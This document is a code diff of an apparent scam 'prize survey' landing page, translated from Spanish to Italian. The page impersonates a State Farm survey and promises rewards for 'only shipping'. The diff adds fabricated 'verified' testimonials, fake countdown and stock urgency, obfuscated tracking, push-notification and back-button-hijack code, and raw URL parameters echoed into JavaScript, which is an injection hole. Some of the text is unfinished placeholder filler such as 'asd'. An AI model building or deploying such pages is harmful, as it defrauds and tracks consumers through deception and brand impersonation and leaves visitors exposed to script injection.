@@ -1,14 +1,81 @@
 <!DOCTYPE html>
 
-<html lang="es">
+<?php
+// w4 logo
+
+$page_peel_brand = "";
+  if ($_GET['s'] == "1016") {
+$page_peel_brand = <<<page_peel_brand
+<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
+<style>
+img.banner {
+    position: fixed;
+    top: 0;
+    width: 150px;
+    z-index: 999999999999;
+}
+</style>
+page_peel_brand;
+  }
+// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
+session_start();
+require_once dirname(__FILE__) . "/../wall/nas-functions.php";
+if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
+  $tag = $_GET['nasTag'];
+} else {
+  $tag = "";
+}
+
+$data = GetNasWall("asd", null, $tag)[0];
+
+require_once(dirname(__FILE__) . "/../helpers.php");
+if (getcwd() === "/var/surveys/redzun") {
+    include("_php_voluum_clock_or_lptoken_check-w14.php");
+} else {
+    include(dirname(__FILE__) . "/../_php_voluum_clock_or_lptoken_check-w14.php");
+}
+
+if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
+  else $country = 'us';
+
+$_SESSION['cc'] = $country; // Set Country ID
+
+if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
+  else $wid = 'default';
+
+$_SESSION['wid'] = $_GET['wid']; // Set Wall ID
+
+$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
+$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;
+
+?>
+<script>
+  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
+  pr_name = "<?php echo str_rot13(""); ?>";
+
+
+</script>
+
+<script>
+ 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
+			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
+			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
+			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
+			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
+			
+			var jumpurl;
+      jumpurl = '<?php echo $data->url ?>';
+ </script>
+
+<html lang="it">
 
 <head>
-    <base href="/folderName/" />
+    <base href="/new-folder/" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="cache-control" content="public">
-    <title>[1] Recompensa pendiente - ¡Queremos tu opinión!</title>
+    <title>[1] Premio in sospeso - Vogliamo il tuo parere!</title>
     <link rel="icon" href="./files/hrlogo.png">
     <link rel="stylesheet" type="text/css" href="./files/bootstrap.min.css" />
     <link rel="stylesheet" type="text/css" href="./files/all.css">
@@ -326,12 +393,12 @@
                         transform="translate(-108.537 -42.904)"></path>
                 </g>
             </svg>
-            ¡Más de $4,000,000 en ofertas otorgadas hasta ahora!
+            Finora sono stati distribuiti oltre 4.000.000 di dollari di offerte!
         </div>
     </div>
     <div class="pt-1 pt-lg-2 hd">
         <div class="text-center p-2">
-            <div class="sub_title container"><span>Encuesta independiente sobre</span></div>
+            <div class="sub_title container"><span>Indagine indipendente su</span></div>
             <div class="logo-container">
                 <img src="./files/4gsgzoddk6k.png" style="margin-top:10px; margin-bottom: 10px; width: 128px;" />
                 <style>
@@ -396,17 +463,17 @@
             <div class="questions-containerS">
                 <div id="origahog" style="display: flex; flex-direction: row;">
                     <div class="left_side_cs" style="width: 100%; padding: 20px;">
-                        <div class="congrats_block" style="color: rgb(237,29,36);">¡FELICIDADES!</div>
+                        <div class="congrats_block" style="color: rgb(237,29,36);">CONGRATULAZIONI!</div>
                         <div class="main_text_content">
-                            <span class="frs_ttx">Has sido seleccionado para la oportunidad de recibir un nuevo</span>
-                            <strong class="nm_prod" style="color: rgb(237,29,36);">¡RECOMPENSA EXCLUSIVA!</strong><br />
-                           Para tener la oportunidad de reclamar tu premio, responde algunas preguntas sobre tu experiencia con H&amp;R Block.
+                            <span class="frs_ttx">Sei stato scelto per avere la possibilità di ricevere un nuovo</span>
+                            <strong class="nm_prod" style="color: rgb(237,29,36);">asd</strong><br />
+                           Per avere la possibilità di rivendicare il tuo premio, rispondi a qualche domanda sulla tua esperienza con State Farm.
                             <div class="mt-3 mb-3">
-                                <div class="attent_new"><i class="att_img_time"></i>Atención: Esta oferta expira hoy</span>, <b class="date-full"></b></div>
+                                <div class="attent_new"><i class="att_img_time"></i>Attenzione: questa offerta scade oggi</span>, <b class="date-full"></b></div>
                             </div>
                             <div class="message-footer">
                                 <button class="continue button btn-tx bh-color btxh-color"
-                                    style="background-color: rgb(237,29,36) !important; border: 0; -webkit-box-shadow: 0 2px 0 white!important;">INICIAR ENCUESTA</button>
+                                    style="background-color: rgb(237,29,36) !important; border: 0; -webkit-box-shadow: 0 2px 0 white!important;">INIZIA L&#x27;INDAGINE</button>
                             </div>
                         </div>
                     </div>
@@ -429,7 +496,7 @@
                             <div class="form_content clearfix">
                                 <div class="header_quest">
                                     <div class="step_question"><span></div>
-                                    <div class="question_des">¿Con qué frecuencia visitas State Farm para tus necesidades de seguros?</div>
+                                    <div class="question_des">Con quanta frequenza visiti un punto vendita State Farm per le tue esigenze assicurative?</div>
                                 </div>
                                 <form action="" class="form_quest">
                                     <ul>
@@ -439,7 +506,7 @@
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption q1option gender-form" value="male"
-                                                for="ch1_1">Varias veces al año</label>
+                                                for="ch1_1">Più volte alla settimana</label>
                                         </li>
                                         <li>
                                             <input name="ch1_2" type="radio" id="gender" value="" hidden>
@@ -447,7 +514,7 @@
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption q1option gender-form"
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                value="female" for="ch1_2">Una vez al año</label>
+                                                value="female" for="ch1_2">Una volta alla settimana</label>
                                         </li>
                                         <li>
                                             <input name="ch1_3" type="radio" id="gender" value="" hidden>
@@ -455,7 +522,7 @@
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption q1option gender-form"
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                value="female" for="ch1_3">Unas cuantas veces al mes</label>
+                                                value="female" for="ch1_3">Qualche volta al mese</label>
                                         </li>
                                         <li>
                                             <input name="ch1_4" type="radio" id="gender" value="" hidden>
@@ -463,7 +530,7 @@
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption q1option gender-form"
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                value="female" for="ch1_4">Rara vez o nunca
+                                                value="female" for="ch1_4">Raramente o mai
                                             </label>
                                         </li>
                                     </ul>
@@ -476,7 +543,7 @@
                             <div class="form_content clearfix">
                                 <div class="header_quest">
                                     <div class="step_question"><span></span></div>
-                                    <div class="question_des">¿Qué motiva principalmente tu elección de comprar en State Farm?</div>
+                                    <div class="question_des">Cosa guida principalmente la tua scelta di acquistare presso un punto vendita State Farm?</div>
                                 </div>
                                 <form action="" class="form_quest">
                                     <ul>
@@ -485,28 +552,28 @@
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption age-form" for="ch2_1" value="Under 18"
-                                                class="q1option">Conveniencia del servicio</label>
+                                                class="q1option">Comodità della posizione</label>
                                         </li>
                                         <li>
                                             <input name="ch2_2" type="radio" id="age" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption age-form" for="ch2_2" value="18-29"
-                                                class="q1option">Reputación y confianza</label>
+                                                class="q1option">Selezione di prodotti</label>
                                         </li>
                                         <li>
                                             <input name="ch2_3" type="radio" id="age" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption age-form" for="ch2_3" value="30-39"
-                                                class="q1option">Productos de seguros y precios</label>
+                                                class="q1option">Prezzi e offerte</label>
                                         </li>
                                         <li>
                                             <input name="ch2_4" type="radio" id="age" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption age-form" for="ch2_4" value="40-49"
-                                                class="q1option">Servicio al cliente</label>
+                                                class="q1option">Programma di premi fedeltà</label>
                                         </li>
                                     </ul>
                                 </form>
@@ -518,7 +585,7 @@
                             <div class="form_content clearfix">
                                 <div class="header_quest">
                                     <div class="step_question"><span></span></div>
-                                    <div class="question_des">¿Cómo sueles responder al ver anuncios de State Farm?
+                                    <div class="question_des">Quando vedi gli annunci di State Farm, come ti comporti di solito?
                                     </div>
                                 </div>
                                 <form action="" class="form_quest">
@@ -527,26 +594,26 @@
                                             <input name="ch3_1" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch3_1" class="q1option">Investigo las pólizas que necesito</label>
+                                                class="choices answerOption" for="ch3_1" class="q1option">Cerco gli articoli di cui ho bisogno</label>
                                         </li>
                                         <li>
                                             <input name="ch3_2" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption" for="ch3_2"
-                                                class="q1option">Busco ofertas y descuentos</label>
+                                                class="q1option">Sfoglio se c&#x27;è una buona offerta</label>
                                         </li>
                                         <li>
                                             <input name="ch3_3" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch3_3" class="q1option">Considero cambiarme si hay una oferta convincente</label>
+                                                class="choices answerOption" for="ch3_3" class="q1option">Considero una visita se c&#x27;è una promozione</label>
                                         </li>
                                         <li>
                                             <input name="ch3_4" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch3_4" class="q1option">Normalmente ignoro los anuncios</label>
+                                                class="choices answerOption" for="ch3_4" class="q1option">Di solito ignoro gli annunci</label>
                                         </li>
                                     </ul>
                                 </form>
@@ -558,7 +625,7 @@
                             <div class="form_content clearfix">
                                 <div class="header_quest">
                                     <div class="step_question"><span></span></div>
-                                    <div class="question_des">Si ganas un premio de State Farm, ¿cómo cambiaría tu opinión sobre State Farm?</div>
+                                    <div class="question_des">Se vincessi un ASD (Dispositivo di ascolto assistito) da State Farm, come cambierà la tua opinione su State Farm?</div>
                                 </div>
                                 <form action="" class="form_quest">
                                     <ul>
@@ -566,27 +633,27 @@
                                             <input name="ch4_1" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch4_1" class="q1option">Significativamente más positiva</label>
+                                                class="choices answerOption" for="ch4_1" class="q1option">Significativamente più positiva</label>
                                         </li>
                                         <li>
                                             <input name="ch4_2" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch4_2" class="q1option">Algo más positiva</label>
+                                                class="choices answerOption" for="ch4_2" class="q1option">Un po&#x27; più positiva</label>
                                         </li>
                                         <li>
                                             <input name="ch4_3" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption" for="ch4_3"
-                                                class="q1option">Sin cambios</label>
+                                                class="q1option">Nessun cambiamento</label>
                                         </li>
                                         <li>
                                             <input name="ch4_4" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption" for="ch4_4"
-                                                class="q1option">Más negativa</label>
+                                                class="q1option">Più negativa</label>
                                         </li>
                                     </ul>
                                 </form>
@@ -598,7 +665,7 @@
                             <div class="form_content clearfix">
                                 <div class="header_quest">
                                     <div class="step_question"><span></span></div>
-                                    <div class="question_des">En cuanto al premio, ¿qué característica te atrae más?</div>
+                                    <div class="question_des">Per quanto riguarda l&#x27;ASD, quale caratteristica ti attrae di più?</div>
                                 </div>
                                 <form action="" class="form_quest">
                                     <ul>
@@ -607,26 +674,26 @@
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption" for="ch5_1"
-                                                class="q1option">Precios competitivos</label>
+                                                class="q1option">Resistenza</label>
                                         </li>
                                         <li>
                                             <input name="ch5_2" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch5_2" class="q1option">Excelente atención al cliente</label>
+                                                class="choices answerOption" for="ch5_2" class="q1option">Portabilità</label>
                                         </li>
                                         <li>
                                             <input name="ch5_3" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
                                                 class="choices answerOption" for="ch5_3"
-                                                class="q1option">Servicio confiable</label>
+                                                class="q1option">Design e aspetto</label>
                                         </li>
                                         <li>
                                             <input name="ch5_4" type="radio" value="" hidden>
                                             <label
                                                 style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                                class="choices answerOption" for="ch5_4" class="q1option">Soluciones innovadoras</label>
+                                                class="choices answerOption" for="ch5_4" class="q1option">Quanto è probabile che tu utilizzi un ASD se ne ricevessero uno da State Farm?</label>
                                         </li>
                                     </ul>
                                 </form>
@@ -641,22 +708,22 @@
                 <div class="flash_block"></div>
                 <div class="loader_block">
                     <div class="title_loaderbar">
-                        <div class="loader_label">Procesando</div>
-                        <div class="loader_text_r">Espera mientras procesamos tus respuestas...</div>
+                        <div class="loader_label">Elaborazione</div>
+                        <div class="loader_text_r">Attendi mentre elaboriamo le tue risposte...</div>
                     </div>
 
                     <div class="p-4 row step_loader">
                         <div class="loader_item loader_item1">
                             <p class="load_text load_text1 mb-1"><span class="fa fa-spinner fa-spin check1 mr-2"
-                                    aria-hidden="true"></span>Respuestas enviadas</p>
+                                    aria-hidden="true"></span>Risposte inviate</p>
                         </div>
                         <div class="loader_item loader_item2">
                             <p class="load_text load_text2 mb-1"><span class="fa fa-spinner fa-spin check2 mr-2"
-                                    aria-hidden="true"></span>Comprobación de dirección IP</p>
+                                    aria-hidden="true"></span>Controllo indirizzo IP</p>
                         </div>
                         <div class="loader_item loader_item3">
                             <p class="load_text load_text3 mb-1"><span class="fa fa-spinner fa-spin check3 mr-2"
-                                    aria-hidden="true"></span>Productos disponibles en stock</p>
+                                    aria-hidden="true"></span>Prodotti disponibili in magazzino</p>
                         </div>
                     </div>
 
@@ -679,12 +746,12 @@
                 <div class="row mt_hands mt-sm-3 mt-0" style="margin-top: 80px; line-height: 1.2">
                     <div class="thankyou-text_new flex">
                         <div class="thankyou-text2">
-                            <div class='ty_txt'>¡GRACIAS POR COMPLETAR NUESTRA ENCUESTA!</div>
+                            <div class='ty_txt'>GRAZIE PER AVER COMPLETATO LA NOSTRA INDAGINE!</div>
                             <div class="text_reward">
-                                Por favor, elige (1) recompensa exclusiva. <br>
-                                No abandones esta página porque los productos son limitados.
+                                Scegli (1) premio esclusivo. <br>
+                                Non abbandonare questa pagina perché i prodotti sono limitati.
                             </div>
-                            <div class="promo_code">Código de cupón canjeado correctamente <span class="code">EXCLUSIVESHOP<b
+                            <div class="promo_code">Codice coupon riscattato con successo <span class="code">EXCLUSIVESHOP<b
                                         class="year"></b><span></div>
                         </div>
                     </div>
@@ -700,48 +767,48 @@
                             <div class="reward_cont flex">
                                 <div class="image-wrapper" style="display: flex; justify-content: center;">
                                     <div class="qun_price">
-                                        <font class="count_n">En stock: <span class="time1"></span>
+                                        <font class="count_n">Disponibili in magazzino: <span class="time1"></span>
                                             2
                                         </font>
                                     </div>
                                     <div class="image"><a class="remove_link" target="_blank"><span
                                                 class="favor_icon"><span></span></span><img
-                                                style="max-height: 250px; height: 250px;" src="./files/98jrw9c9xsr (1).png"
+                                                style="max-height: 250px; height: 250px;" src="./files/favicon.png"
                                                 alt="reward"></a>
                                     </div>
                                 </div>
                                 <div class="right-wrapper">
                                     <div class="description">
                                         <div class="name">
-                                            asdasdsa
+                                            asd
                                         </div>
                                         <div class="rt_block"><span class="rt_count"></span><span
                                                 class="star_comment"></span><span class="rating-text">
                                                 4891
                                             </span></div>
                                         <div class="des">
-                                            ahawfasda
+                                            asd
                                         </div>
                                         <div class="price_info">
                                             <div class="colon_price"><span class="shipp_price"><span
-                                                        class="ship_text">Tu oportunidad:</span><span class="ship-cost">
-                                                        €0.00
+                                                        class="ship_text">La tua possibilità:</span><span class="ship-cost">
+                                                        $0.00
                                                     </span></span><span class="old_price"><span
-                                                        class="text_old_price">Precio regular:</span><span>
-                                                        €gasdfadw
+                                                        class="text_old_price">Prezzo regolare:</span><span>
+                                                        $asd
                                                     </span></span></div>
                                         </div>
                                     </div>
                                     <a class="remove_link" target="_blank">
-                                        <img src="" style="display:none;"></img>
+                                        <img src="<?php echo $data->impression_url ?>" style="display:none;"></img>
                                         <button
                                             style="background-color: rgb(237,29,36) !important; -webkit-box-shadow: 0 2px 0 white!important;"
-                                            id="buttonLink_<?php echo $object->title; ?>"
-                                            class="text-center btn-lg click_claim_btn">¡LO QUIERO!
+                                            id="button1"
+                                            class="text-center btn-lg click_claim_btn">LO VOGLIO!
                                             <i class="fa fa-shopping-cart mr-2" aria-hidden="true"></i>
                                         </button>
-                                        <div class="new_price"><span>Sólo paga el envío</span></div>
-                                        <p class="expires_in_tx"><span>Caduca en: <span
+                                        <div class="new_price"><span>Solo spese di spedizione</span></div>
+                                        <p class="expires_in_tx"><span>Scadenza in: <span
                                                     class="expires_in">5:52</span></span></p>
                                     </a>
                                 </div>
@@ -754,13 +821,13 @@
         </div>
 
         <div id="comment-page" class="comment-page">
-            <div class="text-center mt-3 title_comment" style="font-size: 20px;font-weight:600;">Comentarios recientes:</div>
+            <div class="text-center mt-3 title_comment" style="font-size: 20px;font-weight:600;">Commenti recenti:</div>
 
             <div class="comment_input_container text-center mt-5">
                 <div class="text-left textarea_block">
                     <input id="comment_input" type="text" placeholder="Write a comment...">
                     <span class="text-center" id="comment_put" onclick="comment()">
-                        <span>Enviar</span>
+                        <span>Invia</span>
                     </span>
                 </div>
             </div>
@@ -774,18 +841,18 @@
                                 <i class="confirm_icon"></i>
                             </div>
                             <div class="name_user">
-                                Jade Martin
+                                Lyla Adams
                             </div>
                             <div class="time_comm">
-                                <span class="comment-time">Hace 14 horas</span>
+                                <span class="comment-time">14 ore fa</span>
                             </div>
                         </div>
                         <div class="verif_block">
-                            Verificado
+                            Verificato
                         </div>
                     </div>
                     <div class="description_block">
-                        ¡Conseguí un premio de esta encuesta! Estaba un poco escéptico al principio, pero aproveché la oportunidad y ¡gané!!
+                        Ho ricevuto un premio da questa indagine! All&#x27;inizio ero un po&#x27; scettico, ma ho corso un rischio e ho vinto!!
                     </div>
                     <div class="likes-container">
                         <button class="like-button"></button>
@@ -801,18 +868,18 @@
                                 <i class="confirm_icon"></i>
                             </div>
                             <div class="name_user">
-                                Gabriel Bernard
+                                Hudson Wilson
                             </div>
                             <div class="time_comm">
-                                <span class="comment-time">Hace 8 horas</span>
+                                <span class="comment-time">8 ore fa</span>
                             </div>
                         </div>
                         <div class="verif_block">
-                            Verificado
+                            Verificato
                         </div>
                     </div>
                     <div class="description_block">
-                        Acabo de recibir esto por correo y lo intenté. ¡Estoy emocionado de conseguir mi recompensa! ¿Puedo enviar la encuesta a mis amigos también?
+                        L&#x27;ho appena ricevuta per posta e l&#x27;ho provata. Sono entusiasta di ricevere il mio premio. Posso inviare l&#x27;indagine anche ai miei amici?
                     </div>
                     <div class="likes-container">
                         <button class="like-button"></button>
@@ -828,21 +895,21 @@
                                 <i class="confirm_icon"></i>
                             </div>
                             <div class="name_user">
-                                Ambre Moreau
+                                Ivy Lewis
                             </div>
                             <div class="time_comm">
-                                <span class="comment-time">Hace 1 día</span>
+                                <span class="comment-time">1 giorno fa</span>
                             </div>
                         </div>
                         <div class="verif_block">
-                            Verificado
+                            Verificato
                         </div>
                     </div>
                     <div class="description_block">
                         <div><img
-                                src="p001my7niy (1).jpeg"
+                                src="download.png"
                                 alt="" style="width: 150px;margin-bottom:5px"></div>
-                        Hice la encuesta, pero esta vez no gané ningún premio...
+                        Ho fatto l&#x27;indagine ma questa volta non ho ricevuto alcun premio...
                     </div>
                     <div class="likes-container">
                         <button class="like-button"></button>
@@ -858,21 +925,21 @@
                                 <i class="confirm_icon"></i>
                             </div>
                             <div class="name_user">
-                                Léo Robert
+                                Colton Walker
                             </div>
                             <div class="time_comm">
-                                <span class="comment-time">Hace 1 día</span>
+                                <span class="comment-time">1 giorno fa</span>
                             </div>
                         </div>
                         <div class="verif_block unverif">
-                            No verificado
+                            Non verificato
                         </div>
                     </div>
                     <div class="description_block">
                         <div><img
-                                src="6yt9s9tgfwo (1).png"
+                                src="product (1).png"
                                 alt="" style="width: 150px;margin-bottom:5px"></div>
-                        Normalmente no me interesan estas encuestas online, pero esta valió la pena. ¡Vamos a aprovechar al máximo la freidora de aire Ninja, gracias!
+                        Di solito non mi interessano queste indagini online, ma questa volta è effettivamente valsa la pena. Useremo al meglio l&#x27;asd, grazie!
                     </div>
                     <div class="likes-container">
                         <button class="like-button"></button>
@@ -888,18 +955,18 @@
                                 <i class="confirm_icon"></i>
                             </div>
                             <div class="name_user">
-                                Emma Richard
+                                Hazel Harris
                             </div>
                             <div class="time_comm">
-                                <span class="comment-time">Hace 2 días</span>
+                                <span class="comment-time">2 giorni fa</span>
                             </div>
                         </div>
                         <div class="verif_block">
-                            Verificado
+                            Verificato
                         </div>
                     </div>
                     <div class="description_block">
-                        ¡Recibí mi recompensa de esta encuesta hoy! Una sorpresa agradable, definitivamente la recomendaré a mis amigos.
+                        Ho ricevuto il mio premio da questa indagine oggi!! Una piacevole sorpresa, la consiglio sicuramente ai miei amici
                     </div>
                     <div class="likes-container">
                         <button class="like-button"></button>
@@ -909,23 +976,16 @@
             </div>
         </div>
         <div class="footer">
-            <p class="copyright">Copyright © <span class="year"></span> <a id="policy-btn">Política de privacidad</a> | <a
-                    id="terms-btn">Términos y condiciones</a></p>
-            THIS IS AN INDEPENDENT SURVEY. This website is not affiliated with or endorsed by, and does not claim to own
-            any
-            of the trademarks, trade names or rights related to any of the products which are the property of their
-            respective
-            owners, who do not own, endorse or promote this website. * Sample products offered on the last page require
-            shipping and handling. Please consult the manufacturer's website for details as terms vary with offers.
-            Please
-            review the important terms and conditions relating to this survey, site and advertisement.
+            <p class="copyright">Copyright © <span class="year"></span> <a id="policy-btn">Informativa sulla privacy</a> | <a
+                    id="terms-btn">Termini e condizioni</a></p>
+            SI TRATTA DI UN&#x27;INDAGINE INDIPENDENTE. Questo sito web non è affiliato né approvato da e non pretende di possedere alcun marchio, nome commerciale o diritto relativi ai prodotti di proprietà dei rispettivi titolari, i quali non possiedono, approvano o promuovono questo sito web. * I prodotti campione offerti nell&#x27;ultima pagina richiedono spedizione e spese di gestione. Per maggiori dettagli, consultare il sito web del produttore, poiché i termini variano con le offerte. Si prega di rivedere i termini e le condizioni importanti relativi a questa indagine, al sito e all&#x27;annuncio.
         </div>
     </div>
     <div class="bottom-bar expire-bar" style="background-color: rgb(237,29,36) !important;">
         <div class="bottom_bg" style="background-color: rgb(237,29,36) !important;"></div>
         <div class="container footer_container" style="margin: auto">
             <div class="row">
-                <div class="offer_expires expire-tx" style="color: white !important;">Oferta caduca en <span id="time"
+                <div class="offer_expires expire-tx" style="color: white !important;">L&#x27;offerta scade in <span id="time"
                         class="time" style="color: white !important;">6:30</span></div>
             </div>
         </div>
@@ -944,7 +1004,7 @@
         </div>
     </div>
     <script>
-        var monthString = "Enero, Febrero, Marzo, Abril, Mayo, Junio, Julio, Agosto, Septiembre, Octubre, Noviembre, Diciembre";
+        var monthString = "Gennaio, Febbraio, Marzo, Aprile, Maggio, Giugno, Luglio, Agosto, Settembre, Ottobre, Novembre, Dicembre";
 
         var monthArray = monthString.split(', ').map(month => month.trim());
 
@@ -994,5 +1054,35 @@
         }
     </script>
 </body>
+
+<script>
+    document.getElementById('button1').addEventListener("click",function(){
+        var urlParams = new URLSearchParams(window.location.search);
+        
+        window.location.href = jumpurl ;
+    },false);
+</script>
+
+<?php
+        if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
+        {
+            $aff_id = "2";
+            if (!empty($_GET["s"])) {
+                $aff_id = $_GET["s"];
+            }
+            
+            $trk_urls = [
+                "https://" . $_GET["trk"] . "/click/20"
+            ];
+            
+            echo getPushCode("us", $aff_id, $trk_urls);
+        }
+        ?>
+        
+        <?php
+        $backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
+        
+        echo getBackButton($backbutton_url);
+?>
 
 </html>
